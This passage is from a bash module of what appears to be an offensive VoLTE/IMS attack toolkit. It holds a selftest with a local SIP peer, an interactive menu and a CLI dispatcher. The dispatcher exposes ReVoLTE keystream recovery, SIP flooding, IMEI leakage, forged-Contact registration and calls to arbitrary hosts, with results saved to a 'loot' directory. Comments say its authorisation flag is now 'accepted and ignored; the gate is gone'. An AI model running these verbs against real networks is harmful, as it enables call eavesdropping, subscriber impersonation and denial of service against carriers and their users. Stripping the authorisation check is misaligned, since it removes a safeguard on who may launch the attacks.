    chk aka-rfc2617-kat "$(vims_py akadigest 436972636c65204f66204c696665 Mufasa testrealm@host.com GET /dir/index.html dcd98b7102dd2f0e8b11d0f600bfb0c093 00000001 0a4f113b auth | awk -F'\t' '$1=="response_raw"{print $2}')" "6629fae49393a05397450978507c4ef1"
    aka_resp=$(awk -F'\t' '$1=="response_hex"{print $2}' "$aka_err")
    aka_raw=$(awk -F'\t' '$1=="response_raw"{print $2}' "$aka_err")
    chk aka-digest-in-message "$(printf '%s' "$aka_out" | grep -c "response=\"$aka_resp\"")" "1"
    chk aka-raw-differs "$([[ "$aka_resp" != "$aka_raw" ]] && echo yes || echo no)" "yes"
    chk aka-raw-selected "$(vims_register_aka $aka_fix nonce="$aka_nonce" encoding=raw 2>/dev/null | grep -c "response=\"$aka_raw\"")" "1"
    chk aka-first-line "$(printf '%s\n' "$aka_out" | head -1 | tr -d '\r')" "REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0"
    chk aka-algorithm "$(printf '%s' "$aka_out" | grep -c 'algorithm=AKAv1-MD5')" "1"
    chk aka-stdout-clean "$(printf '%s' "$aka_out" | grep -c $'\t')" "0"
    chk aka-no-k "$(vims_register_aka rand=23553cbe9637a89d218ae64dae47bf35 nonce="$aka_nonce" >/dev/null 2>&1; echo $?)" "2"
    chk aka-no-nonce "$(vims_register_aka $aka_fix >/dev/null 2>&1; echo $?)" "2"
    chk aka-no-nonce-says "$(vims_register_aka $aka_fix 2>&1 >/dev/null | grep -c 'WWW-Authenticate nonce')" "1"
    chk aka-bad-encoding "$(vims_register_aka $aka_fix nonce="$aka_nonce" encoding=b64 >/dev/null 2>&1; echo $?)" "2"
    chk aka-nonce-mismatch "$(vims_register_aka k=465b5ce8b199b49faa5f0a2ee238a6bc op=cdc202d5123e20f62b6d676ac72cb318 rand=000102030405060708090a0b0c0d0e0f nonce="$aka_nonce" 2>&1 >/dev/null | grep -c 'does not decode to that RAND')" "1"

    # 13. Placing a call: a dialog has to stay one dialog -- the same Call-ID
    #     and From tag on every request, the To tag the answer assigned, a new
    #     branch and the next CSeq per transaction, and the ACK addressed to
    #     the Contact the answer named. A scripted peer is the proof: it logs
    #     what actually arrived and the arms below read that log back.
    local cport clog cpid cout carc
    cport=$(( 30000 + RANDOM % 20000 ))
    clog="$d/call.log"
    cat > "$d/peer.py" <<'PYP'
import socket, sys
port, log, mode = int(sys.argv[1]), sys.argv[2], sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", port))
s.settimeout(10.0)
out = open(log, "w")


def recv():
    data, peer = s.recvfrom(65535)
    text = data.decode("utf-8", "replace")
    lines = text.split("\r\n\r\n")[0].split("\r\n")
    h = {}
    for ln in lines[1:]:
        k, sep, v = ln.partition(":")
        h[k.strip().lower()] = v.strip()
    return peer, lines[0], h


def reply(peer, text):
    s.sendto(text.encode(), peer)


def common(h, tag):
    return ("Via: %s\r\nFrom: %s\r\nTo: %s;tag=%s\r\nCall-ID: %s\r\nCSeq: %s\r\n"
            % (h.get("via", ""), h.get("from", ""), h.get("to", ""), tag,
               h.get("call-id", ""), h.get("cseq", "")))


def logreq(line, h):
    out.write("REQ\t%s\tcseq=%s\tcallid=%s\tto=%s\tauthz=%s\n"
              % (line, h.get("cseq", ""), h.get("call-id", ""),
                 h.get("to", ""), h.get("authorization", "")))
    out.flush()


peer, line, h = recv()
logreq(line, h)
if mode == "auth":
    reply(peer, "SIP/2.0 401 Unauthorized\r\n" + common(h, "beef")
          + 'WWW-Authenticate: Digest realm="ims.test", nonce="99887766", '
            'algorithm=AKAv1-MD5, qop="auth"\r\n'
          + "Content-Length: 0\r\n\r\n")
    peer, line, h = recv()
    logreq(line, h)
reply(peer, "SIP/2.0 100 Trying\r\n" + common(h, "cafe") + "Content-Length: 0\r\n\r\n")
reply(peer, "SIP/2.0 200 OK\r\n" + common(h, "cafe")
      + "Contact: <sip:callee@127.0.0.1:%d>\r\nContent-Length: 0\r\n\r\n" % port)
peer, line, h = recv()
logreq(line, h)
peer, line, h = recv()
logreq(line, h)
reply(peer, "SIP/2.0 200 OK\r\n" + common(h, "cafe") + "Content-Length: 0\r\n\r\n")
out.close()
PYP
    python3 "$d/peer.py" "$cport" "$clog" plain &
    cpid=$!
    sleep 0.3
    cout=$(VIMS_SIP_TIMEOUT=3 vims_call_flow "127.0.0.1:$cport" \
               to=310150987654321@ims.test domain=ims.test 2>/dev/null)
    carc=$?
    wait "$cpid" 2>/dev/null || true
    chk call-rc "$carc" "0"
    chk call-status "$(fld "$cout" status)" "call-torn-down"
    chk call-invite-cseq "$(awk -F'\t' '$2 ~ /^INVITE/ {print $3}' "$clog" | head -1)" "cseq=1 INVITE"
    chk call-ack-ruri "$(awk -F'\t' '$2 ~ /^ACK/ {print $2}' "$clog")" \
        "ACK sip:callee@127.0.0.1:$cport SIP/2.0"
    chk call-ack-tag "$(awk -F'\t' '$2 ~ /^ACK/ {print $5}' "$clog" | grep -c 'tag=cafe')" "1"
    chk call-ack-cseq "$(awk -F'\t' '$2 ~ /^ACK/ {print $3}' "$clog")" "cseq=1 ACK"
    chk call-bye-cseq "$(awk -F'\t' '$2 ~ /^BYE/ {print $3}' "$clog")" "cseq=2 BYE"
    chk call-one-callid "$(awk -F'\t' 'NF>3 {print $4}' "$clog" | sort -u | wc -l)" "1"
    chk call-dialog-line "$(printf '%s\n' "$cout" | grep -c '^dialog	callid=')" "1"

    # 14. The challenge path: without credentials the verb says it was
    #     challenged and stops; with a password or with RES it answers, and the
    #     Authorization that reaches the peer carries the challenge's realm.
    cport=$(( 30000 + RANDOM % 20000 ))
    clog="$d/call-auth.log"
    python3 "$d/peer.py" "$cport" "$clog" auth &
    cpid=$!
    sleep 0.3
    cout=$(VIMS_SIP_TIMEOUT=3 vims_call_flow "127.0.0.1:$cport" \
               domain=ims.test 2>/dev/null)
    carc=$?
    wait "$cpid" 2>/dev/null || true
    chk call-auth-bare-rc "$carc" "3"
    chk call-auth-bare-status "$(fld "$cout" status)" "challenged-no-credentials"

    cport=$(( 30000 + RANDOM % 20000 ))
    clog="$d/call-auth2.log"
    python3 "$d/peer.py" "$cport" "$clog" auth &
    cpid=$!
    sleep 0.3
    cout=$(VIMS_SIP_TIMEOUT=3 vims_call_flow "127.0.0.1:$cport" \
               domain=ims.test auth=digest password=secret 2>/dev/null)
    carc=$?
    wait "$cpid" 2>/dev/null || true
    chk call-auth-digest-rc "$carc" "0"
    chk call-auth-digest-realm "$(awk -F'\t' '$6 ~ /realm="ims.test"/ {n++} END{print n+0}' "$clog")" "1"
    chk call-auth-digest-user "$(awk -F'\t' '$6 ~ /username="310150123456789"/ {n++} END{print n+0}' "$clog")" "1"
    chk call-auth-digest-cseq "$(awk -F'\t' '$2 ~ /^INVITE/ {print $3}' "$clog" | tail -1)" "cseq=2 INVITE"

    cport=$(( 30000 + RANDOM % 20000 ))
    clog="$d/call-auth3.log"
    python3 "$d/peer.py" "$cport" "$clog" auth &
    cpid=$!
    sleep 0.3
    cout=$(VIMS_SIP_TIMEOUT=3 vims_call_flow "127.0.0.1:$cport" \
               domain=ims.test auth=aka res=a54211d5e3ba50bf 2>/dev/null)
    carc=$?
    wait "$cpid" 2>/dev/null || true
    chk call-auth-aka-rc "$carc" "0"
    chk call-auth-aka-alg "$(awk -F'\t' '$6 ~ /algorithm=AKAv1-MD5/ {n++} END{print n+0}' "$clog")" "1"

    chk call-no-authority "$(vims_call_flow 127.0.0.1:9 2>&1 >/dev/null | grep -c 'authoris')" "0"
    chk call-no-target "$(vims_call_flow >/dev/null 2>&1; echo $?)" "2"
    chk call-bad-port "$(vims_call_flow 127.0.0.1:99999 >/dev/null 2>&1; echo $?)" "2"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    rm -rf "$d"
    trap - EXIT
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
vims_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== VoLTE / IMS ===${C_RESET}"
        echo -e "  loot: ${C_DIM}$VIMS_DIR${C_RESET}\n"
        cat <<'M'
  [1]  ReVoLTE demo (two plaintexts, one keystream)
  [2]  recover a keystream from a known plaintext
  [3]  detect keystream reuse in a capture
  [4]  parse a SIP message (hex)
  [5]  IMS registration flow (hex)
  [6]  IMP4GT model (sequence + preconditions)
  [7]  write a handoff plan (revolte-capture / imp4gt-lab)
  [8]  register a UE with a real AKAv1-MD5 response
  [9]  place a call against a lab peer (INVITE, auth, ACK, BYE)
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) read -rp "  plaintext1 hex> " a; read -rp "  plaintext2 hex> " b
               vims_cmd_revolte_demo "$a" "$b" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            2) read -rp "  ciphertext hex> " a; read -rp "  known plaintext hex> " b
               read -rp "  second ciphertext hex (blank)> " s
               vims_cmd_keystream_recover "$a" "$b" "$s" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            3) read -rp "  pcap> " p; read -rp "  udp port (0=any)> " pt
               vims_cmd_detect_reuse "$p" "$pt" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            4) read -rp "  hex> " h; vims_cmd_sip_parse "$h" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            5) read -rp "  hex> " h; vims_cmd_ims_registration "$h" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            6) vims_imp4gt_model | column -t -s$'\t' 2>/dev/null || vims_imp4gt_model
               read -rp "  press enter " _ ;;
            9) read -rp "  host[:port]> " h; read -rp "  callee> " t
               read -rp "  auth none|digest|aka> " m
               if [[ "$m" == "aka" ]]; then
                   read -rp "  K hex> " k; read -rp "  op hex> " o; read -rp "  RAND hex> " r
                   vims_call_flow "$h" "to=$t" "auth=aka" "k=$k" "op=$o" "rand=$r"
               elif [[ "$m" == "digest" ]]; then
                   read -rsp "  password> " pw; echo
                   vims_call_flow "$h" "to=$t" "auth=digest" "password=$pw"
               else
                   vims_call_flow "$h" "to=$t"
               fi
               read -rp "  press enter " _ ;;
            8) read -rp "  K hex> " k; read -rp "  op or opc> " t
               read -rp "  $t hex> " o; read -rp "  RAND hex> " r
               read -rp "  nonce (base64, from the 401)> " n
               case "$t" in
                   opc) vims_register_aka "k=$k" "opc=$o" "rand=$r" "nonce=$n" ;;
                   *)   vims_register_aka "k=$k" "op=$o" "rand=$r" "nonce=$n" ;;
               esac
               read -rp "  press enter " _ ;;
            7) read -rp "  plan (revolte-capture|imp4gt-lab)> " k
               vims_plan "$k"; read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
vims_cli_main() {
    # The old authority flag is stripped wherever it appears so no verb has to
    # parse the argument list to find it and none sees it as a stray operand.
    # Nothing is recorded: this module has no gate.
    local a
    local -a args=()
    for a in "$@"; do
        if [[ "$a" == "--i-have-a-lab-and-authorisation" ]]; then
            : # accepted and ignored; the gate is gone
        else
            args+=("$a")
        fi
    done
    if ((${#args[@]})); then set -- "${args[@]}"; else set --; fi
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)             vims_cli_status_tsv ;;
        --revolte-demo)           vims_cmd_revolte_demo "${1:-}" "${2:-}" ;;
        --keystream-recover)      vims_cmd_keystream_recover "${1:-}" "${2:-}" "${3:-}" ;;
        --imp4gt-model)           vims_imp4gt_model ;;
        --sip-parse)              vims_cmd_sip_parse "${1:-}" ;;
        --sip-build)              vims_sip_build "$@" ;;
        --sip-send)               vims_sip_send "$@" ;;
        --ims-registration)       vims_cmd_ims_registration "${1:-}" "${2:-}" ;;
        --detect-keystream-reuse) vims_cmd_detect_reuse "$@" ;;
        --sip-flood)              vims_sip_flood "${1:-INVITE}" "${2:-100}" "${3:-400}" "${4:-1600}" ;;
        --imei-leak)              vims_imei_leak "${1:-}" ;;
        --register-spoof)         vims_register_spoof "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
        --register-aka)           vims_register_aka "$@" ;;
        --call)                   vims_call_flow "$@" ;;
        --rtp-stats)              vims_cmd_rtp_stats ;;
        --sip-probe)              vims_cmd_sip_probe "$@" ;;
        --g711)                   vims_cmd_g711 "${1:-}" "${2:-}" "${3:-}" ;;
        --plan)                   vims_plan "${1:-}" ;;
        --selftest)               vims_selftest ;;
        --menu)                   vims_menu ;;
        *)
            cat >&2 <<EOF
VoLTE / IMS Attacks — ReVoLTE keystream reuse, IMP4GT, SIP and IMS registration

Usage: $0 COMMAND
  --status-tsv                              module state as TSV
  --revolte-demo <pt1-hex> <pt2-hex>        same-keystream XOR demonstration
  --keystream-recover <ct> <known-pt> [ct2] recover the keystream and decrypt
  --imp4gt-model                            IMP4GT sequence and preconditions
  --sip-parse <hex>                         SIP request/response, headers, SDP
  --sip-build <register|register-auth|challenge|invite> [key=value ...]
                                            build the message as wire bytes
                                            (stdout is the message, nothing else)
  --sip-send <host>[:port] <kind> [k=v ...]  build it and put it on the wire
                                            (no flag needed)
  --sip-flood [method] [rps] [reqB] [respB] SIP flood / amplification model
  --imei-leak <sip-text>                    IMEI / location / device leakage over SIP
  --register-spoof [impi] [contact]         SIP REGISTER with a forged Contact
  --register-aka k=.. op=..|opc=.. rand=.. nonce=..  REGISTER with a real
                                            AKAv1-MD5 response: RES from Milenage,
                                            hashed into the RFC 2617 digest
                                            (encoding=hex|raw chooses how RES is
                                            hashed, since RFC 3310 does not say)
  --call <host>[:port] [flags] [key=value]  place a call: INVITE, answer the
                                            challenge, ACK, media, BYE
                                            auth=none|digest|aka, password=,
                                            res=, to=, domain=, bye=0
      --media none|mic|wav:<file>|silence   carry audio instead of ringing and
                                            hanging up: G.711, 8 kHz, 20 ms
      --codec PCMU|PCMA                     the codec this leg speaks (AMR is
                                            offered in the SDP, refused if the
                                            answer picks it)
      --play                                play the far end through aplay
      --record-wav <file.wav>               or write its audio to a wav
      --duration <seconds>                  talk for that long, then BYE
                                            (0 = until interrupted)
      --rtp-port <n>                        the RTP port to offer (0 = pick one)
  --sip-probe <host>[:port] [user=...]       ask the far end whether a UA is
                                            listening (OPTIONS), before a call
  --rtp-stats                               the media numbers of the last call
  --g711 <PCMU|PCMA> encode|decode <hex>    the codec alone, no call, so the
                                            tables can be checked by hand
  --ims-registration <hex> [aka-res-hex]    IMS REGISTER/401/AKA flow
  --detect-keystream-reuse <pcap> [port] [--calls <tsv>]
                                            reuse detector, two calls at a time
  --plan <revolte-capture|imp4gt-lab>       write a handoff plan
  --selftest                                verify crypto and parsers, no radio
  --menu                                    interactive menu

Papers: ReVoLTE (Rupprecht, Kohls, Holz, Popper), USENIX Security 2020;
IMP4GT (same authors), NDSS 2020. Crypto known answer: NIST SP 800-38A F.5.1;
Digest known answer: RFC 2617 section 3.5.
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    vims_cli_main "$@"
fi
